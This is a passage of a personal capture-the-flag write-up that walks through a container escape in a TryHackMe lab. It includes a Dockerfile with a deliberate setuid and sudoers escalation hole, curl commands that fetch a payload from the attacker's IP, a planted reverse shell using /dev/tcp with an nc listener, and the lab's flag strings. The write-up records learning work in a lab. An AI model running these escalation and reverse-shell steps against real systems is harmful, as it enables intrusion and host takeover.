# Set up escalation     
RUN chmod +s `which env`
RUN apt-get update && apt-get install sudo -y
RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers

# Write flag
RUN echo "THM{D1ff3r3nt_3nv1ronments_874112}" > /root/flag3.txt
RUN chmod 400 /root/flag3.txt

RUN echo "THM{LF1_t0_RC3_aec3fb}" > /var/www/flag2_QMW7JvaY2LvK.txt

EXPOSE 80

# Configure a healthcheck to validate that everything is up&running
HEALTHCHECK --timeout=10s CMD curl --silent --fail http://127.0.0.1:80/
HEALTHCHECK --timeout=10s CMD curl --silent --fail http://127.0.0.1:80/
```
I downloaded the backup.tar file using the LFI(it already converts it to base64 and can handle bigger outputs so it was more convinient)
and once I downloaded it I extracted it locally and ran the command
`git log`
to see the history of the commits on the project:
![[Pasted image 20241220190904.png]]
From looking at the files inside the project I see that there are some of them which are packed, and I would like to unpack them to be able to see what they contain.
I did man git and saw that there is a command called git-unpack-objects so lets try it.
man git unpack-objects
```bash
git unpack-objects pack-948e40d4da0d6578c6687a3e4e3329eabf58f1a0.pack -r # When unpacking a corrupt packfile, the command dies at the first corruption. This flag tells it to keep going and make the best effort to recover as many objects as possible. 

```
added the flag just in case:)
It didnt work this way so in the meantime I try other things I opened the whole .git folder in sublime so I can look at it comfortably and search for things.
I found this user as the last commiter:
`root@dogfrog`
I wonder to myself if dogfrog may be his password.
lets try it, didnt work lets keep on.
I ran afterwards git show hoping to see something useful in the commit but found nothing:
```
diff --git a/README.md b/README.md
index 2fa28b7..c317e28 100644
--- a/README.md
+++ b/README.md
@@ -58,3 +58,18 @@ PHP-FPM configuration:
     docker run -v "`pwd`/php-fpm-settings.conf:/etc/php7/php-fpm.d/server.conf" trafex/alpine-nginx-php7
 
 _Note; Because `-v` requires an absolute path I've added `pwd` in the example to return the absolute path to the current directory_ 
+
+
+## Adding composer
+
+If you need composer in your project, here's an easy way to add it;
+
+```dockerfile
+FROM trafex/alpine-nginx-php7:latest
+
+# Install composer from the official image
+COPY --from=composer /usr/bin/composer /usr/bin/composer
+
+# Run composer install to install the dependencies
+RUN composer install --optimize-autoloader --no-interaction --no-progress
+
```
I saw that I can give a commit hash to git show and it will show the diff too.
lets do it.
```
commit 531442435d41292619d456c619790c9c193bf8c9
Author: Tim de Pater <git@trafex.nl>
Date:   Sun Feb 2 20:36:51 2020 +0100

    Made the /var/www/html folder owned by nobody

diff --git a/Dockerfile b/Dockerfile
index 375c47b..901c2d8 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -19,15 +19,16 @@ COPY config/php.ini /etc/php7/conf.d/custom.ini
 # Configure supervisord
 COPY config/supervisord.conf /etc/supervisor/conf.d/supervisord.conf
 
+# Setup document root
+RUN mkdir -p /var/www/html
+
 # Make sure files/folders needed by the processes are accessable when they run under the nobody user
-RUN chown -R nobody.nobody /run && \
+RUN chown -R nobody.nobody /var/www/html && \
+  chown -R nobody.nobody /run && \
   chown -R nobody.nobody /var/lib/nginx && \
   chown -R nobody.nobody /var/tmp/nginx && \
   chown -R nobody.nobody /var/log/nginx
 
-# Setup document root
-RUN mkdir -p /var/www/html
-
 # Make the document root a volume
 VOLUME /var/www/html
```


```
commit 341cc9c6b4be7b3113a8dfc6923e61d49adb1644 (tag: 1.3.0)
Author: Tim de Pater <git@trafex.nl>
Date:   Wed Nov 6 08:49:51 2019 +0100

    Describe the way to customize the configuration of Nginx and PHP

diff --git a/README.md b/README.md
index 53eeffc..2fa28b7 100644
--- a/README.md
+++ b/README.md
@@ -40,3 +40,21 @@ See the PHP info on http://localhost, or the static html page on http://localhos
 Or mount your own code to be served by PHP-FPM & Nginx
 
     docker run -p 80:8080 -v ~/my-codebase:/var/www/html trafex/alpine-nginx-php7
+
+## Configuration
+In [config/](config/) you'll find the default configuration files for Nginx, PHP and PHP-FPM.
+If you want to extend or customize that you can do so by mounting a configuration file in the correct folder;
+
+Nginx configuration:
+
+    docker run -v "`pwd`/nginx-server.conf:/etc/nginx/conf.d/server.conf" trafex/alpine-nginx-php7
+
+PHP configuration:
+
+    docker run -v "`pwd`/php-setting.ini:/etc/php7/conf.d/settings.ini" trafex/alpine-nginx-php7
+
+PHP-FPM configuration:
+
+    docker run -v "`pwd`/php-fpm-settings.conf:/etc/php7/php-fpm.d/server.conf" trafex/alpine-nginx-php7
+
+_Note; Because `-v` requires an absolute path I've added `pwd` in the example to return the absolute path to the current directory_
```
Nothing interesting so far...
```
commit 5fa9be019bdc76dc3c7f1f477629b097a3ba54c3
Author: Tim de Pater <git@trafex.nl>
Date:   Wed Nov 6 08:48:30 2019 +0100

    Don't force the PHP customizations to be the last file to load

diff --git a/Dockerfile b/Dockerfile
index 7079321..375c47b 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -14,7 +14,7 @@ RUN rm /etc/nginx/conf.d/default.conf
 
 # Configure PHP-FPM
 COPY config/fpm-pool.conf /etc/php7/php-fpm.d/www.conf
-COPY config/php.ini /etc/php7/conf.d/zzz_custom.ini
+COPY config/php.ini /etc/php7/conf.d/custom.ini
 
 # Configure supervisord
 COPY config/supervisord.conf /etc/supervisor/conf.d/supervisord.conf

```

```
commit 775a6295aad5657706690a0c8e4a40212b6663d1
Author: Tim de Pater <git@trafex.nl>
Date:   Tue Nov 5 15:21:21 2019 +0100

    Added automated smoketest

diff --git a/docker-compose.test.yml b/docker-compose.test.yml
new file mode 100644
index 0000000..96fbb73
--- /dev/null
+++ b/docker-compose.test.yml
@@ -0,0 +1,11 @@
+version: '3.5'
+services:
+  app:
+    build: .
+  sut:
+    image: alpine:3.10
+    depends_on:
+      - app
+    command: /tmp/run_tests.sh
+    volumes:
+      - "./run_tests.sh:/tmp/run_tests.sh:ro"
diff --git a/run_tests.sh b/run_tests.sh
new file mode 100755
index 0000000..8ef6032
--- /dev/null
+++ b/run_tests.sh
@@ -0,0 +1,3 @@
+#!/usr/bin/env sh
+apk --no-cache add curl
+curl --silent --fail http://app:8080 | grep 'PHP 7.3'
```


```
commit 6084df92acf9d847bbae0463ba0edf07802c0c12
Author: Tim de Pater <git@trafex.nl>
Date:   Tue Nov 5 14:27:30 2019 +0100

    Updated README

diff --git a/README.md b/README.md
index 5cab15e..53eeffc 100644
--- a/README.md
+++ b/README.md
@@ -12,7 +12,7 @@ Repository: https://github.com/TrafeX/docker-php-nginx
 * Optimized to only use resources when there's traffic (by using PHP-FPM's ondemand PM)
 * The servers Nginx, PHP-FPM and supervisord run under a non-privileged user (nobody) to make it more secure
 * The logs of all the services are redirected to the output of the Docker container (visible with `docker logs -f <container name>`)
-* Follows the KISS principle (Keep It Simple, Stupid) to make it easy to understand and adjust the image
+* Follows the KISS principle (Keep It Simple, Stupid) to make it easy to understand and adjust the image to your needs
 
 
 [![Docker Pulls](https://img.shields.io/docker/pulls/trafex/alpine-nginx-php7.svg)](https://hub.docker.com/r/trafex/alpine-nginx-php7/)
```
Afterwards I tried to run `git checkout COMMIT_HASH` to have a more in depth look of the commit state.
I see from the commits that there is another http service, nginx running on localhost port 9000.
lets try to apprach it from the container.
```python
exec('curl http://127.0.0.1:9000')
```
Got no response:(
I went over all of the commits and found nothing interesting.
I ran git status
and saw that there are deleted files, lets restore them.
I ran git restore on the following file names:
```
deleted:    config/fpm-pool.conf                                    
deleted:    config/nginx.conf                                           
deleted:    config/php.ini                                           
deleted:    config/supervisord.conf         
deleted:    docker-compose.test.yml                                
deleted:    src/test.html
```
Found nothing interesting in them too:(
I was not sure that I didn't miss  anything so I did the following:
```
cat backup.tar | grep -i ssh
cat backup.tar | grep -i user
cat backup.tar | grep -i pass
cat backup.tar | grep -i cred
```
I realized that doing git show isn't convenient as it show only the diff between.
I see that going after the older commits is not helpful, so I try to approach it in a different way, and look at the files in latest commit of the backup.
I try to look again in Dockerfile
and can't see anything I can impact now, its only responsible for creating the environment for the 3 first flags on the container but I need to escape it so its not helpful.
There is also the launch.sh script, which is responsible for the creation of the container, 
from looking at it now more deeply I see that it runs the following docker command:
```bash
docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
```
Lets understand what each of the flag means:
-d:   detach, Run container in background and print container ID
-p: Publish a container's port(s) to the host
-v: Bind mount a volume
--rm: Automatically remove the container when it exits
So in summary this command:
Runs a detached container from terminal which ran it, published the port 80(where the website is running) to the host, mounted the volume /root/container/backup on the container as /opt/backups and deletes it in the end.
First thing that comes to my mind is that maybe I can access the host's file system through opt/backups.
lets check it out:
```python
exec('ls -lat /opt/backups/../../..')
```
Of course it didn't work, I got the / directory of the container.
Lets check what other files are there in the /opt/backups directory:
```
-rw-r--r-- 1 root root 2949120 Dec 21 12:09 backup.tar
drwxr-xr-x 1 root root    4096 Dec 21 08:51 ..
drwxr-xr-x 2 root root    4096 Apr  8  2020 .
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
```
I see that there is a script called backup.sh, maybe if I'll change it it will run on the host?
Lets try
```bash 
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
ls -lat /root > /tmp/result
base64 backup.sh 
IyEvYmluL2Jhc2gKdGFyIGNmIC9yb290L2NvbnRhaW5lci9iYWNrdXAvYmFja3VwLnRhciAvcm9v
dC9jb250YWluZXIKaXAgYSA+IC90bXAvcmVzCg==
```
```python
exec('echo -n "IyEvYmluL2Jhc2gKdGFyIGNmIC9yb290L2NvbnRhaW5lci9iYWNrdXAvYmFja3VwLnRhciAvcm9v
dC9jb250YWluZXIKaXAgYSA+IC90bXAvcmVzCg==" | base64 -d > /opt/backups/backup.sh')
```
It did not work for some reason, so I did the following 

```bash 
php -S 0.0.0.0:80
exec('curl 10.8.3.163/backup.sh -o /opt/backups/backup.sh')
exec('cat /opt/backups/backup.sh')
exec('ls -lat /tmp')
```

Seems like it isn't run by a cron on the host or something, and triggering it myself will not make it work because it will give me the output of the container / directory.
Maybe the solution is to remount the /opt/backups directory?
Lets try it locally first,  ill pull a docker image, run a container and do the exact same thing to see that it doesnt break and works.

```bash
docker pull debian:10
docker run 69530eaa9e7e bash -it -v /home/kali/root/container/backup:/opt/backup 
docker run  bash -it -v /home/kali/root/container/backup:/opt/backup 69530eaa9e7e
docker run -it -v /home/kali/root/container/backup:/opt/backup 69530eaa9e7e bash 
```
It takes me too long to get the command to work so ill just try to rebind the mount on the machine.
```python
exec('mount --rbind /opt/backups /root/container ')
```
Seems like it did not change anything
maybe the solution is in the script itself?
lets look at the backup.sh script again:
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
The script  takes /root/container directory and tars it into /root/container/backup/backup.tar
How can I break this thing?
maybe I can solve it with a symlink?
maybe if Ill create a container file/directory? 
Lets create the same heirarchy on the container and use a symlink to make /opt/backups point to our new dirs.
```python
exec('mkdir /root/container')
exec('mkdir /root/container/backup')
exec('ln -s /opt/backups /root/container/backup')
```
Seems like it did the opposite direction.
When I modify the file /opt/backups/backup.sh I practically modify /root/container/backup/backup.sh.  
The problem is, that the container isn't aware that this hierarchy exists 
from looking at the /etc/mtab(I saw it being refrenced in the mount manual)
I see the following:
![[Pasted image 20241221095350.png]]
Maybe I can approach /dev/xvda2 differently?
![[Pasted image 20241221095610.png]]
Seems like it isn't a concept lol
but I can get it from the procFS - /proc/fs/ext4/xvda2/
I am overcomplicating things lets think simpler, and be more hermetic of the ideas 
It seems that after I run the script it does take the right backup from the host and the container,which is weird, maybe just my specific poc was problematic.
My conclusion that it is not being ran by a cron may be mistaken because now that I think of it the change I made was to put it in /tmp, maybe the script did put it in /tmp but I was not able to see it beacuse it is not mapped for the container.
Lets try to do a simpler thing and just change the script to make a reverse shell(another option is to put it in /root/container/backup/ so it will be mapped to me in /opt/backups).
Lets listen locally on port 8888
```bash
nc -nlvvvp 8888
```

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i 2>&1 >/dev/tcp/10.8.3.163/8888
```
and of course as before
```python
exec('curl 10.8.3.163/backup.sh -o /opt/backups/backup.sh')  
```
I had a mistake in my reverse shell so it closed immediately,
![[Pasted image 20241221103939.png]]lets try again:
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i >& /dev/tcp/10.8.3.163/8888 
```
It worked!
![[Pasted image 20241221104235.png]]
I got the final flag!
# ==Flag 4==

```
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```
